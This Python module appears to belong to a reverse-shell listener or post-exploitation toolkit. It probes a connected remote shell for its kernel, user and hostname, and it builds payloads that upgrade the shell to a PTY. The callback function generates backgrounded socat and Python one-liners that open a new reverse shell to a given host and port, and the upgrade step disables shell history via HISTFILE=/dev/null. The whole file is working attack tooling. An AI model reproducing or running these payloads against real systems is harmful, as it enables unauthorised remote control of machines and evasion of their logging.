from __future__ import annotations

import asyncio
import re
import secrets
import shlex

from ._scan import StreamScanner
from .session import Session

_SENTINEL_PREFIX = "@@PWFP"
_BEGIN = f"{_SENTINEL_PREFIX}BEGIN@@"
_END = f"{_SENTINEL_PREFIX}END@@"

# Hosts get interpolated into shell + python one-liners (see callback_pty_payload),
# so restrict them to the characters that appear in IPv4/IPv6 literals and DNS
# names. A stray quote, space, or shell metacharacter is rejected rather than
# silently producing a broken — or injectable — payload.
_SAFE_HOST_RE = re.compile(r"^[A-Za-z0-9_.:-]{1,255}$")


def validate_target(host: str, port: int) -> str | None:
    """Return a human-readable error if (host, port) is unsafe, else ``None``."""
    if not host or not _SAFE_HOST_RE.match(host):
        return f"unsafe host {host!r} — expected an IP address or hostname"
    try:
        p = int(port)
    except (TypeError, ValueError):
        return f"port not an integer: {port!r}"
    if not (1 <= p <= 65535):
        return f"port out of range (1..65535): {p}"
    return None


_PROBE_SH = (
    f"echo {_BEGIN}; "
    "uname -srm 2>/dev/null; "
    "id 2>/dev/null; "
    "hostname 2>/dev/null; "
    "echo \"$SHELL\"; "
    "pwd 2>/dev/null; "
    f"echo {_END}"
)


class Fingerprinter:
    """Collects incoming bytes until the sentinel window is complete, then parses."""

    def __init__(self, session: Session) -> None:
        self.session = session
        self._scan = StreamScanner()
        self._begin = _BEGIN.encode()
        self._end = _END.encode()
        self._done = asyncio.Event()

    def _on_data(self, session: Session, data: bytes) -> None:
        self._scan.feed(data)
        i = self._scan.find(self._begin)
        if i < 0:
            return
        start = i + len(self._begin)
        stop = self._scan.find(self._end, start)
        if stop < 0:
            return
        self._parse(self._scan.text(start, stop))
        self._done.set()

    def _parse(self, block: str) -> None:
        lines = [ln.strip() for ln in block.splitlines() if ln.strip()]
        fp = self.session.fingerprint
        if not lines:
            return
        fp.kernel = lines[0] if len(lines) >= 1 else ""
        fp.os = _guess_os(fp.kernel)
        if len(lines) >= 2:
            m = re.search(r"uid=\d+\(([^)]+)\)", lines[1])
            fp.user = m.group(1) if m else lines[1]
        if len(lines) >= 3:
            fp.hostname = lines[2]
        if len(lines) >= 4:
            fp.shell = lines[3]
        if len(lines) >= 5:
            fp.cwd = lines[4]
        self.session.save_meta()

    async def run(self, timeout: float = 4.0) -> bool:
        self.session.add_data_hook(self._on_data)
        try:
            await self.session.send((_PROBE_SH + "\n").encode())
            try:
                await asyncio.wait_for(self._done.wait(), timeout=timeout)
                return True
            except TimeoutError:
                return False
        finally:
            self.session.remove_data_hook(self._on_data)


def _guess_os(kernel: str) -> str:
    k = kernel.lower()
    if "darwin" in k:
        return "macOS"
    if "linux" in k:
        return "Linux"
    if "freebsd" in k:
        return "FreeBSD"
    if "cygwin" in k or "mingw" in k or "msys" in k:
        return "Windows (cygwin)"
    if "windows" in k or "microsoft" in k:
        return "Windows"
    return ""


def pty_upgrade_payload(
    rows: int = 32,
    cols: int = 120,
    term: str = "xterm-256color",
    shell: str = "",
) -> tuple[str, str]:
    """
    Build a PTY-upgrade shell payload and a unique 'ready sentinel' that the target
    will emit once it's through the upgrade. Returns (payload, ready_marker).

    Strategy, in order of preference on the target:
      1. python3  - always best, pty.spawn proxies the socket ↔ pty master
      2. python   - same as above for Python 2 hosts
      3. script   - uses OS-appropriate syntax:
                    Darwin/BSD:  script -q /dev/null <shell>
                    Linux:       script -qc <shell> /dev/null
      4. none     - emits a clearly marked failure message

    After the upgrade, a second line runs stty + TERM + a sentinel echo inside
    the new PTY — if we see the sentinel come back, the upgrade worked.
    """
    ready = f"@@PW_PTY_READY_{secrets.token_hex(4)}@@"
    fail = f"@@PW_PTY_FAIL_{secrets.token_hex(4)}@@"

    if not shell:
        shell_expr = 'S="${SHELL:-/bin/bash}"'
    else:
        shell_expr = f'S={shlex.quote(shell)}'

    spawn = (
        f"{shell_expr}; "
        "if command -v python3 >/dev/null 2>&1; then "
        'python3 -c "import pty,os,sys;pty.spawn([os.environ.get(\\"S\\",\\"/bin/bash\\"),\\"-i\\"])" 2>/dev/null '
        '|| python3 -c "import pty;pty.spawn([\\"$S\\",\\"-i\\"])"; '
        "elif command -v python >/dev/null 2>&1; then "
        'python -c "import pty;pty.spawn([\\"$S\\",\\"-i\\"])"; '
        "elif command -v script >/dev/null 2>&1; then "
        '  U="$(uname 2>/dev/null)"; '
        '  if [ "$U" = Darwin ] || [ "$U" = FreeBSD ] || [ "$U" = OpenBSD ] || [ "$U" = NetBSD ]; then '
        '    script -q /dev/null "$S"; '
        "  else "
        '    script -qc "$S -i" /dev/null; '
        "  fi; "
        "else "
        f'  echo {fail}; '
        "fi"
    )
    config = (
        f"stty rows {rows} cols {cols} 2>/dev/null; "
        f"export TERM={shlex.quote(term)}; "
        "export HISTFILE=/dev/null 2>/dev/null; "
        f"echo {ready}"
    )
    return (f"{spawn}\n{config}\n", ready)


def callback_pty_payload(host: str, port: int) -> str:
    """Build a fire-and-forget shell payload that opens a *new* socket back to us
    with a real PTY around bash. Caller's existing dumb shell stays as-is —
    the new connection lands as a fresh session in the registry.

    Strategy preference (target side):
      1. socat   — cleanest: `tcp:HOST:PORT exec:/bin/bash,pty,stderr,setsid,sigint,sane`
      2. python3 — fresh socket + pty.spawn(["/bin/bash","-i"])
      3. python  — same as above for Python 2 hosts
      4. fail marker — caller sees `@@PW_RECONNECT_FAIL@@` in scrollback

    We background each via `(... &)` so the spawned proc is reparented to init
    and survives the original shell exiting.
    """
    err = validate_target(host, port)
    if err:
        raise ValueError(err)
    h = host
    p = int(port)
    socat_cmd = (
        f"socat tcp:{h}:{p} exec:/bin/bash,pty,stderr,setsid,sigint,sane"
    )
    py3_cmd = (
        "python3 -c \"import socket,os,pty;"
        f"s=socket.socket();s.connect(('{h}',{p}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn(['/bin/bash','-i'])\""
    )
    py2_cmd = (
        "python -c \"import socket,os,pty;"
        f"s=socket.socket();s.connect(('{h}',{p}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn(['/bin/bash','-i'])\""
    )
    return (
        "if command -v socat >/dev/null 2>&1; then "
        f"({socat_cmd} >/dev/null 2>&1 &); "
        "elif command -v python3 >/dev/null 2>&1; then "
        f"({py3_cmd} >/dev/null 2>&1 &); "
        "elif command -v python >/dev/null 2>&1; then "
        f"({py2_cmd} >/dev/null 2>&1 &); "
        "else echo @@PW_RECONNECT_FAIL@@; fi\n"
    )


class PtyUpgrader:
    """Sends the payload and watches for either the success or failure marker."""

    def __init__(self, session: Session, rows: int, cols: int, shell: str = "") -> None:
        self.session = session
        self.rows = rows
        self.cols = cols
        self.shell = shell
        self._scan = StreamScanner()
        self._fail = b"@@PW_PTY_FAIL_"
        self._ok = asyncio.Event()
        self._failed = False
        self._ready_marker = b""

    def _on_data(self, s: Session, data: bytes) -> None:
        self._scan.feed(data)
        if self._scan.find(self._fail) >= 0:
            self._failed = True
            self._ok.set()
        elif self._ready_marker and self._scan.find(self._ready_marker) >= 0:
            self._ok.set()

    async def run(self, timeout: float = 6.0) -> tuple[bool, str]:
        """Returns (success, message)."""
        payload, marker = pty_upgrade_payload(self.rows, self.cols, shell=self.shell)
        self._ready_marker = marker.encode()
        self.session.add_data_hook(self._on_data)
        try:
            await self.session.send(payload.encode())
            try:
                await asyncio.wait_for(self._ok.wait(), timeout=timeout)
            except TimeoutError:
                return (False, "no response — target may have no python/script, or isn't a shell")
            if self._failed:
                return (False, "target has no python or script — PTY upgrade impossible from here")
            return (True, f"PTY ready ({self.rows}×{self.cols})")
        finally:
            self.session.remove_data_hook(self._on_data)
